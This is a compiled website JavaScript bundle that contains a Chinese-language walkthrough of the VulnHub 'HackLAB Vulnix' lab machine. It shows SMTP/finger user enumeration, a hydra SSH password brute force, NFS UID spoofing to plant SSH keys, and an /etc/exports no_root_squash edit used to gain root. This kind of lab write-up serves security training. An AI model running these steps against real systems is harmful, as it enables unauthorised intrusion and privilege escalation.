"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[2117],{6145:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>t,contentTitle:()=>c,default:()=>h,frontMatter:()=>o,metadata:()=>r,toc:()=>a});const r=JSON.parse('{"id":"VulnHub/Virtual Machines/HackLAB Vulnix","title":"HackLAB Vulnix","description":"port scan","source":"@site/docs/VulnHub/Virtual Machines/HackLAB Vulnix.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/HackLAB Vulnix","permalink":"/docs/VulnHub/Virtual Machines/HackLAB Vulnix","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/HackLAB Vulnix.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"FristiLeaks_1.3","permalink":"/docs/VulnHub/Virtual Machines/FristiLeaks_1.3"},"next":{"title":"JOY","permalink":"/docs/VulnHub/Virtual Machines/JOY"}}');var i=s(4848),l=s(8453);const o={},c=void 0,t={},a=[{value:"port scan",id:"port-scan",level:3},{value:"vuln scan",id:"vuln-scan",level:4},{value:"servrices enumeration",id:"servrices-enumeration",level:3},{value:"SSH",id:"ssh",level:3},{value:"Privilege Escalation",id:"privilege-escalation",level:3},{value:"vulnix",id:"vulnix",level:4},{value:"root",id:"root",level:4}];function d(n){const e={a:"a",blockquote:"blockquote",code:"code",h3:"h3",h4:"h4",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,l.R)(),...n.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(e.h3,{id:"port-scan",children:"port scan"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# Nmap 7.94SVN scan initiated Sun Nov 10 01:50:10 2024 as: nmap -sT --min-rate 5000 -p- -oN nmap_results/port_scan 192.168.27.6\r\nNmap scan report for 192.168.27.6\r\nHost is up (0.0022s latency).\r\nNot shown: 65518 closed tcp ports (conn-refused)\r\nPORT      STATE SERVICE\r\n22/tcp    open  ssh\r\n25/tcp    open  smtp\r\n79/tcp    open  finger\r\n110/tcp   open  pop3\r\n111/tcp   open  rpcbind\r\n143/tcp   open  imap\r\n512/tcp   open  exec\r\n513/tcp   open  login\r\n514/tcp   open  shell\r\n993/tcp   open  imaps\r\n995/tcp   open  pop3s\r\n2049/tcp  open  nfs\r\n36951/tcp open  unknown\r\n40856/tcp open  unknown\r\n58796/tcp open  unknown\r\n59337/tcp open  unknown\r\n59705/tcp open  unknown\r\nMAC Address: 00:0C:29:FA:2A:6E (VMware)\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"nmap -sT -sV -sC -O -p22,25,79,110,111,143,512,513,514,993,995,2049,36951,40856,58796,59337,59705 -oN nmap_results/detils_scan 192.168.27.6\n"})}),"\n",(0,i.jsx)(e.h4,{id:"vuln-scan",children:"vuln scan"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"nmap --script=vuln -p22,25,79,110,111,143,512,513,514,993,995,2049,36951,40856,58796,59337,59705 -oN nmap_results/srcipt_scan 192.168.27.6\n"})}),"\n",(0,i.jsx)(e.h3,{id:"servrices-enumeration",children:"servrices enumeration"}),"\n",(0,i.jsxs)(e.p,{children:["\u5148\u679a\u4e3e",(0,i.jsx)(e.code,{children:"smtp"}),"\u670d\u52a1"]}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.a,{href:"https://github.com/pentestmonkey/finger-user-enum",children:"https://github.com/pentestmonkey/finger-user-enum"})}),"\n"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"./finger-user-enum.pl -U /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -t 192.168.27.6\n"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241110154619981.png",alt:"image-20241110154619981"})}),"\n",(0,i.jsxs)(e.p,{children:["\u4e00\u4e2a",(0,i.jsx)(e.code,{children:"user"}),",\u4e00\u4e2a",(0,i.jsx)(e.code,{children:"root"})]}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"finger"}),"\u670d\u52a1"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"\u250c\u2500\u2500(root\u327fkali)-[~/vulnhub/HackLAB_Vulnix]\r\n\u2514\u2500# finger user@192.168.27.6\r\nLogin: user                             Name: user\r\nDirectory: /home/user                   Shell: /bin/bash\r\nOn since Sun Nov 10 07:40 (GMT) on pts/0 from 192.168.27.3\r\n   7 minutes 40 seconds idle\r\nNo mail.\r\nNo Plan.\r\n\r\nLogin: dovenull                         Name: Dovecot login user\r\nDirectory: /nonexistent                 Shell: /bin/false\r\nNever logged in.\r\nNo mail.\r\nNo Plan.\n"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.code,{children:"2049/tcp  open  nfs"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"\u250c\u2500\u2500(root\u327fkali)-[~/vulnhub/HackLAB_Vulnix]\r\n\u2514\u2500# showmount -e 192.168.27.6\r\nExport list for 192.168.27.6:\r\n/home/vulnix *\r\n                                                                                                                                                                          \r\n\u250c\u2500\u2500(root\u327fkali)-[~/vulnhub/HackLAB_Vulnix]\r\n\u2514\u2500# mount -t nfs 192.168.27.6:/home/vulnix vulnix  -nolock                       \r\nmount.nfs: access denied by server while mounting 192.168.27.6:/home/vulnix\r\n                                                                                                                                                                          \r\n\u250c\u2500\u2500(root\u327fkali)-[~/vulnhub/HackLAB_Vulnix]\r\n\u2514\u2500# cd vulnix                    \r\ncd: permission denied: vulnix\n"})}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"SSH"}),"\u670d\u52a1"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"\u250c\u2500\u2500(root\u327fkali)-[~/vulnhub/HackLAB_Vulnix]\r\n\u2514\u2500# hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://192.168.27.6 -t 4\r\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\r\n[DATA] attacking ssh://192.168.27.6:22/\r\n[STATUS] 44.00 tries/min, 44 tries in 00:01h, 14344355 to do in 5433:29h, 4 active\r\n[STATUS] 33.33 tries/min, 100 tries in 00:03h, 14344299 to do in 7172:09h, 4 active\r\n[STATUS] 29.14 tries/min, 204 tries in 00:07h, 14344195 to do in 8203:23h, 4 active\r\n[STATUS] 29.40 tries/min, 441 tries in 00:15h, 14343958 to do in 8131:30h, 4 active\r\n[22][ssh] host: 192.168.27.6   login: user   password: letmein\r\n1 of 1 target successfully completed, 1 valid password found\r\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-10 02:39:06\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u62ff\u5230\u51ed\u636e",(0,i.jsx)(e.code,{children:"user:letmein"})]}),"\n",(0,i.jsx)(e.h3,{id:"ssh",children:"SSH"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"ssh user@192.168.27.6\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u5bc6\u7801\uff1a",(0,i.jsx)(e.code,{children:"letmein"})]}),"\n",(0,i.jsx)(e.h3,{id:"privilege-escalation",children:"Privilege Escalation"}),"\n",(0,i.jsx)(e.h4,{id:"vulnix",children:"vulnix"}),"\n",(0,i.jsxs)(e.p,{children:["\u67e5\u770b",(0,i.jsx)(e.code,{children:"passwd"}),"\u6587\u4ef6"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"vulnix:x:2008:2008::/home/vulnix:/bin/bash\n"})}),"\n",(0,i.jsxs)(e.p,{children:["NFS\u5171\u4eab\u6587\u4ef6\u662f\u5426\u53ef\u4ee5\u8bbf\u95ee\uff0c\u53d6\u51b3\u4e8e\u7528\u6237\u548c\u7ec4 ID \u6620\u5c04\uff0c\u53ef\u80fd\u4e0e ",(0,i.jsx)(e.code,{children:"root_squash"})," \u6216 ",(0,i.jsx)(e.code,{children:"all_squash"})," \u9009\u9879\u914d\u7f6e\u6709\u5173"]}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsxs)(e.ul,{children:["\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:"ro"}),"\uff1a\u53ea\u8bfb\u8bbf\u95ee\u3002"]}),"\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:"rw"}),"\uff1a\u8bfb\u5199\u8bbf\u95ee\u3002"]}),"\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:"sync"}),"\uff1a\u540c\u6b65\u5199\u5165\u78c1\u76d8\u3002"]}),"\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:"async"}),"\uff1a\u5f02\u6b65\u5199\u5165\u78c1\u76d8\uff08\u9ed8\u8ba4\uff09\u3002"]}),"\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:"no_root_squash"}),"\uff1a\u5141\u8bb8\u8fdc\u7a0b root \u7528\u6237\u5177\u6709\u672c\u5730 root \u6743\u9650\u3002"]}),"\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:"root_squash"}),"\uff1a\u5c06\u8fdc\u7a0b root \u7528\u6237\u7684\u6743\u9650\u964d\u4f4e\u5230\u533f\u540d\u7528\u6237\uff08\u9ed8\u8ba4\uff09\u3002"]}),"\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:"all_squash"}),"\uff1a\u5c06\u6240\u6709\u8fdc\u7a0b\u7528\u6237\u7684\u8eab\u4efd\u964d\u4f4e\u5230\u533f\u540d\u7528\u6237\u3002"]}),"\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:"anonuid"}),"\uff1a\u6307\u5b9a\u533f\u540d\u7528\u6237\u7684 UID\u3002"]}),"\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:"anongid"}),"\uff1a\u6307\u5b9a\u533f\u540d\u7528\u6237\u7684 GID\u3002"]}),"\n",(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:"subtree_check"}),"\uff1a\u5141\u8bb8\u9012\u5f52\u5bfc\u51fa\u3002"]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(e.p,{children:["\u5df2\u77e5",(0,i.jsx)(e.code,{children:"vulnix"}),"\u7528\u6237\u7684UID\u662f",(0,i.jsx)(e.code,{children:"2008"}),"\uff0c\u53ef\u4ee5\u5728kali\u673a\u5668\u4e0a\u540c\u6837\u521b\u5efa\u4e00\u4e2a",(0,i.jsx)(e.code,{children:"vulnix"}),"\u7528\u6237"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"useradd -u 2008 vulnix\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u6302\u8f7d\u5171\u4eab\u6587\u4ef6"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"mount -t nfs 192.168.27.6:/home/vulnix /tmp/mnt -nolock\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"\u250c\u2500\u2500(root\u327fkali)-[/tmp]\r\n\u2514\u2500# su vulnix\r\n$ id\r\nuid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)\r\n$ cd /tmp/mnt\r\n$ ls -la\r\ntotal 32\r\ndrwxr-x---  4 vulnix vulnix 4096 Nov 10 04:40 .\r\ndrwxrwxrwt 20 root   root    500 Nov 10 04:39 ..\r\n-rw-------  1 vulnix vulnix   33 Nov 10 04:40 .bash_history\r\n-rw-r--r--  1 vulnix vulnix  220 Apr  3  2012 .bash_logout\r\n-rw-r--r--  1 vulnix vulnix 3486 Apr  3  2012 .bashrc\r\ndrwx------  2 vulnix vulnix 4096 Nov 10 03:40 .cache\r\n-rw-r--r--  1 vulnix vulnix  675 Apr  3  2012 .profile\r\n-rw-------  1 vulnix vulnix  654 Nov 10 04:39 .viminfo\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u6302\u8f7d\u6210\u529f\uff0c\u53ef\u4ee5\u8bbf\u95ee\uff0c\u73b0\u5728\u5c06kali\u7684SSH\u516c\u94a5\u5199\u8fdb",(0,i.jsx)(e.code,{children:".ssh"}),"\u6587\u4ef6\uff0c\u5c31\u53ef\u4ee5\u767b\u5f55",(0,i.jsx)(e.code,{children:"vulnix"}),"\u7528\u6237"]}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"ssh-keygen"}),"\u521b\u5efa\u516c\u94a5\uff0c\u56de\u8f66\u5c31\u884c"]}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.code,{children:"ssh-keygen -t rsa"})}),"\n",(0,i.jsxs)(e.p,{children:["\u5c06",(0,i.jsx)(e.code,{children:"id_rsa.pub"}),"\u6587\u4ef6\uff0c\u590d\u5236\u5230",(0,i.jsx)(e.code,{children:".ssh/authorized_keys"})]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"$ cd .ssh\r\n$ ls -al\r\ntotal 12\r\ndrwx------ 2 vulnix vulnix 4096 Nov 10 03:39 .\r\ndrwxr-x--- 4 vulnix vulnix 4096 Nov 10 04:40 ..\r\n-rw-r--r-- 1 vulnix vulnix  563 Nov 10 04:38 authorized_keys\r\n$ cat au*\r\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2nUXm4REZFae90PHbMmdaWoCkDetBLi3yW6rkbd8lRpSHXEf6Lii6wWWDvRZwELJHjhRLEgvnqgvtHSyL1WLrxMXbEjMnhofQwjaVZk2b4D1MtWtH3see7Pg8iFiy4SsPkFdgPAGQxNiJNvus4kuDvFHqHDUNEuoQCcaRF9e3Wd9U2UqVI0ZqRfrKswL47vePb5IaRLNgM7EJlGWlP+ZsP1QP/tvYgjec0MOgclbwbrlVrjUGr+STyfiUXM4QbSy5AxUAVXHTYh77L1KrSP1xurjU0D5dI8RTcYvMbAG5kMgWAVulO6dCFmKeJuu5GoQuo1+2kasz3HtoeNsxsuCQTs7b3jmLpEsd4487HxRtl/V0d+CrAcJ7nph1sI2m/+UFbuZ3V/p74BdtyokEGhnhm86rwDkQs81rR6ZncxPn8DE7C+avmp5HuCyk8WAYbes5S17fU9Anr0WS9I8kRpHHZzUX8Zh3BC/gMG4rACGE/DoDa5Pzj2Alz6UVow7Ml08= root@kali\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u767b\u5f55\uff0c\u6307\u5b9a\u516c\u94a5\u7c7b\u578b"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"ssh vulnix@192.168.27.6 -oPubkeyAcceptedKeyTypes=ssh-rsa\n"})}),"\n",(0,i.jsx)(e.h4,{id:"root",children:"root"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"vulnix@vulnix:~$ sudo -l\r\nMatching 'Defaults' entries for vulnix on this host:\r\n    env_reset, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\r\n\r\nUser vulnix may run the following commands on this host:\r\n    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u53ef\u7f16\u8f91",(0,i.jsx)(e.code,{children:"/etc/exports"}),"\u6587\u4ef6"]}),"\n",(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:"/root    *(rw,no_root_squash)"}),"\u5199\u5165\u6587\u4ef6"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"vulnix@vulnix:~$ sudoedit /etc/exports\r\nvulnix@vulnix:~$ cat /etc/exports \r\n# /etc/exports: the access control list for filesystems which may be exported\r\n#               to NFS clients.  See exports(5).\r\n#\r\n# Example for NFSv2 and NFSv3:\r\n# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)\r\n#\r\n# Example for NFSv4:\r\n# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)\r\n# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)\r\n#\r\n/home/vulnix    *(rw,root_squash)\r\n/root    *(rw,no_root_squash)\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u53ef\u80fd\u9700\u8981\u91cd\u542f\u4e00\u4e0b\u751f\u6548\u6587\u4ef6"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"\u250c\u2500\u2500(root\u327fkali)-[/tmp]\r\n\u2514\u2500# showmount -e 192.168.27.6                               \r\nExport list for 192.168.27.6:\r\n/root        *\r\n/home/vulnix *\n"})}),"\n",(0,i.jsxs)(e.p,{children:["\u540c\u6837\u6302\u8f7d",(0,i.jsx)(e.code,{children:"/root"}),"\uff0c\u590d\u5236\u516c\u94a5\uff0c\u767b\u5f55"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"ssh root@192.168.27.6 -oPubkeyAcceptedKeyTypes=ssh-rsa\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"root@vulnix:~# id\r\nuid=0(root) gid=0(root) groups=0(root)\r\nroot@vulnix:~# whoami\r\nroot\r\nroot@vulnix:~# ls\r\ntrophy.txt\r\nroot@vulnix:~# cat trophy.txt \r\ncc614640424f5bd60ce5d5264899c3be\n"})})]})}function h(n={}){const{wrapper:e}={...(0,l.R)(),...n.components};return e?(0,i.jsx)(e,{...n,children:(0,i.jsx)(d,{...n})}):d(n)}},8453:(n,e,s)=>{s.d(e,{R:()=>o,x:()=>c});var r=s(6540);const i={},l=r.createContext(i);function o(n){const e=r.useContext(l);return r.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function c(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(i):n.components||i:o(n.components),r.createElement(l.Provider,{value:e},n.children)}}}]);